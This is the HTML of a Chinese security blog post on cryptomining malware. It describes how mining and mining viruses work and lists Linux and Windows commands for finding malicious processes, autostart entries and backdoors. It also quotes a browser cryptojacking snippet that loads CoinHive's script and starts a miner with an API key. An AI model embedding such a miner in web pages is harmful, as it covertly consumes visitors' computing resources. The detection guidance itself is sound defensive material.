@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01挖矿概论所谓挖矿，其实就是通过计算机的计算能力获取数字货币。而矿池就是进行生产任务(挖矿)和生产利润的分配。一套挖矿流程大致如下： 1、本地安装挖矿程序并启动 2、挖矿程序向远程矿池请求计算的输入值 3、远程矿池验证该用户并分配任务，发送计算初始值 4、挖矿程序接受初始值并依照特定数字货币算法进行计算，得到计算结果并发送至矿池 5、矿池接受计算结果并发送下一次计算的输入值 0x02挖矿病毒">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="挖矿脚本">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/16/2019-1-16-挖矿脚本/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01挖矿概论所谓挖矿，其实就是通过计算机的计算能力获取数字货币。而矿池就是进行生产任务(挖矿)和生产利润的分配。一套挖矿流程大致如下： 1、本地安装挖矿程序并启动 2、挖矿程序向远程矿池请求计算的输入值 3、远程矿池验证该用户并分配任务，发送计算初始值 4、挖矿程序接受初始值并依照特定数字货币算法进行计算，得到计算结果并发送至矿池 5、矿池接受计算结果并发送下一次计算的输入值 0x02挖矿病毒">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz888mbhsxj20rx0jfgmo.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.107Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="挖矿脚本">
+<meta name="twitter:description" content="0x01挖矿概论所谓挖矿，其实就是通过计算机的计算能力获取数字货币。而矿池就是进行生产任务(挖矿)和生产利润的分配。一套挖矿流程大致如下： 1、本地安装挖矿程序并启动 2、挖矿程序向远程矿池请求计算的输入值 3、远程矿池验证该用户并分配任务，发送计算初始值 4、挖矿程序接受初始值并依照特定数字货币算法进行计算，得到计算结果并发送至矿池 5、矿池接受计算结果并发送下一次计算的输入值 0x02挖矿病毒">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz888mbhsxj20rx0jfgmo.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/16/2019-1-16-挖矿脚本/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>挖矿脚本 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/16/2019-1-16-挖矿脚本/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">挖矿脚本
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-16 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-16T00:00:00+08:00">2019-01-16</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">3.4k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">3 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="0x01挖矿概论"><a href="#0x01挖矿概论" class="headerlink" title="0x01挖矿概论"></a>0x01挖矿概论</h1><p>所谓挖矿，其实就是通过计算机的计算能力获取数字货币。而矿池就是进行生产任务(挖矿)和生产利润的分配。一套挖矿流程大致如下：</p>
+<p>1、本地安装挖矿程序并启动</p>
+<p>2、挖矿程序向远程矿池请求计算的输入值</p>
+<p>3、远程矿池验证该用户并分配任务，发送计算初始值</p>
+<p>4、挖矿程序接受初始值并依照特定数字货币算法进行计算，得到计算结果并发送至矿池</p>
+<p>5、矿池接受计算结果并发送下一次计算的输入值</p>
+<h1 id="0x02挖矿病毒主要特点"><a href="#0x02挖矿病毒主要特点" class="headerlink" title="0x02挖矿病毒主要特点"></a>0x02挖矿病毒主要特点</h1><p>1、由于需要与矿池通信，因此会与矿池建立连接</p>
+<p>2、挖矿利用计算机的算力，因此CPU,GPU的利用率会增加</p>
+<p>3、为防止服务器重启挖矿进程中断，会建立任务实现开机自启动</p>
+<p>4、为便于下一次利用，可能会留木马后门</p>
+<h1 id="0x03挖矿病毒查杀-linux"><a href="#0x03挖矿病毒查杀-linux" class="headerlink" title="0x03挖矿病毒查杀(linux)"></a>0x03挖矿病毒查杀(linux)</h1><h2 id="一：查找病毒文件"><a href="#一：查找病毒文件" class="headerlink" title="一：查找病毒文件"></a>一：查找病毒文件</h2><ol>
+<li>top      查看cpu使用情况，注意cpu异常的command</li>
+<li>netstat -ano      查看是否有异常连接</li>
+<li>ps -ef      命令全局检查异常程序及命令;ps -ef | grep command 查看异常command的进程,记录相应pid</li>
+<li>ls -l /proc/pid      查看相应pid的详细信息(查找病毒执行文件所在地)<pre><code>4.1 cwd：表示进程的运行目录(常为服务器攻击成功后所在目录)
+4.2 exe：表示执行程序的绝对路径(常为病毒文件目录)
+4.3 cmdline：表示程序运行时输入的命令行命令
+4.4 environ：记录进程运行时的环境变量
+4.5 fd：该目录为进程打开或使用的文件的符号连接
+病毒文件找到后，注意解读病毒文件内容，寻找有效信息</code></pre></li>
+</ol>
+<h2 id="二：去除自启动项"><a href="#二：去除自启动项" class="headerlink" title="二：去除自启动项"></a>二：去除自启动项</h2><ol>
+<li>cat      /etc/rc.local 查看rc.local的开机自启动项是否异常</li>
+<li>cd      /var/spool/cron/crontabs; cat filename 查看计划任务是否正常</li>
+<li>ntsysv 或      chkconfig –list 查看系统服务</li>
+</ol>
+<h2 id="三：查找后门文件"><a href="#三：查找后门文件" class="headerlink" title="三：查找后门文件"></a>三：查找后门文件</h2><ol>
+<li>history      ; cat ~/.bash_history 查看被攻击后所执行的历史命令</li>
+<li>find / -mtime 0      返回最近24小时修改过的文件</li>
+<li>find / -mtime 1      返回最近24-48小时间修改过的文件</li>
+<li>netstat -ano      后门文件同样也要建立连接，查看异常连接</li>
+</ol>
+<h1 id="0x04挖矿病毒查杀-windows"><a href="#0x04挖矿病毒查杀-windows" class="headerlink" title="0x04挖矿病毒查杀(windows)"></a>0x04挖矿病毒查杀(windows)</h1><h2 id="一：查找病毒文件-1"><a href="#一：查找病毒文件-1" class="headerlink" title="一：查找病毒文件"></a>一：查找病毒文件</h2><p>当任务管理器能打开时：任务管理查看cpu占用高的进程</p>
+<p>当任务管理器不能打开时：</p>
+<ol>
+<li>netstat      -na 查看异常端口<pre><code>1.1 netstat -ano | findstr “port” 查看对于端口的pid
+1.2 tasklist|findstr “pid” 查看对应pid的占用程序
+1.3 wmic process where name=”进程名” 查找对于进程所在目录</code></pre></li>
+<li>wmic cpu get      loadpercentage(查看总cpu占用)</li>
+<li>wmic process      list brief|full 列出进程</li>
+<li>taskkill /im 进程名      /f;taskkill /pid pid名 /f 杀进程</li>
+</ol>
+<h2 id="二：去除自启动项-1"><a href="#二：去除自启动项-1" class="headerlink" title="二：去除自启动项"></a>二：去除自启动项</h2><p>1、(运行–&gt;regedit)</p>
+<p>HKEY_LOCAL _MACHINE\Software \Microsoft\Windows\CurrentVersion下所有以“run”开头的键值;</p>
+<p>HKEY_CURRENT_USER\Software\ Microsoft\Windows\CurrentVersion下所有以“run”开头的键值;</p>
+<p>HKEY_USERS\Default\Software\Microsoft\Windows\CurrentVersion下所有以“Run”开头的键值;</p>
+<p>部分如下</p>
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]</p>
+<p>[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]</p>
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run]</p>
+<p>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run]</p>
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]</p>
+<p>[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]</p>
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</p>
+<p>[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]</p>
+<p>2、Win.ini中启动</p>
+<p>[windows]字段中的”load=”和”run=”</p>
+<p>3、自启动组</p>
+<p>启动组对应的文件夹为:C: \Windows\Start Menu\Programs\StartUp，</p>
+<p>在注册表中的位置:HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders Startup=”C:\windows\start menu\programs\startup”</p>
+<p>4、修改文件关联</p>
+<p>检查HKEY_CLASSES_ROOT\文件类型\shell\open\command主键，查看其键值是否正常</p>
+<p>DOS下执行scanreg/restore 恢复前5天的注册表</p>
+<h2 id="三：查找后门文件-1"><a href="#三：查找后门文件-1" class="headerlink" title="三：查找后门文件"></a>三：查找后门文件</h2><p>查找后门文件参考一二</p>
+<p><a href="http://tools.ldstu.com/miner/?utm_sources=/archives/41039.html" target="_blank" rel="noopener">挖矿脚本与反挖矿扩展程序测试页</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz888mbhsxj20rx0jfgmo.jpg" alt></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 加载挖矿核心脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://coinhive.com/lib/coinhive.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 测试专用API密钥、名称可自定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var miner = new CoinHive.User('mrvzoq1cDAIacUG3dGEkg2TJznuIogMB','Landian', &#123;</span><br><span class="line">	threads: 4,</span><br><span class="line">	autoThreads: false,</span><br><span class="line">	throttle: 0,</span><br><span class="line">	forceASMJS: false</span><br><span class="line">&#125;);</span><br><span class="line">    miner.start();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 加载统计代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var _hmt = _hmt || [];</span><br><span class="line">(function() &#123;</span><br><span class="line">  var hm = document.createElement("script");</span><br><span class="line">  hm.src = "https://hm.baidu.com/hm.js?2378278a9b9c54d270c1d6245e3c06ed";</span><br><span class="line">  var s = document.getElementsByTagName("script")[0];</span><br><span class="line">  s.parentNode.insertBefore(hm, s);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 统计代码归属于Tools域名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a href="http://www.chaindd.com/3098505.html" target="_blank" rel="noopener">http://www.chaindd.com/3098505.html</a></p>
+<p><a href="http://www.freebuf.com/vuls/181267.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/181267.html</a></p>
+<p><a href="https://coinhive.com/documentation/miner" target="_blank" rel="noopener">coinhive脚本</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/16/2019-1-16-挖矿脚本/" title="挖矿脚本">https://wh0ale.github.io/2019/01/16/2019-1-16-挖矿脚本/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/16/2019-1-16-内核提权/" rel="next" title="内核提权">
+                <i class="fa fa-chevron-left"></i> 内核提权
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/16/2019-1-16-伪造邮件/" rel="prev" title="邮件伪造">
+                邮件伪造 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01挖矿概论"><span class="nav-number">1.</span> <span class="nav-text">0x01挖矿概论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02挖矿病毒主要特点"><span class="nav-number">2.</span> <span class="nav-text">0x02挖矿病毒主要特点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03挖矿病毒查杀-linux"><span class="nav-number">3.</span> <span class="nav-text">0x03挖矿病毒查杀(linux)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一：查找病毒文件"><span class="nav-number">3.1.</span> <span class="nav-text">一：查找病毒文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二：去除自启动项"><span class="nav-number">3.2.</span> <span class="nav-text">二：去除自启动项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三：查找后门文件"><span class="nav-number">3.3.</span> <span class="nav-text">三：查找后门文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04挖矿病毒查杀-windows"><span class="nav-number">4.</span> <span class="nav-text">0x04挖矿病毒查杀(windows)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一：查找病毒文件-1"><span class="nav-number">4.1.</span> <span class="nav-text">一：查找病毒文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二：去除自启动项-1"><span class="nav-number">4.2.</span> <span class="nav-text">二：去除自启动项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三：查找后门文件-1"><span class="nav-number">4.3.</span> <span class="nav-text">三：查找后门文件</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
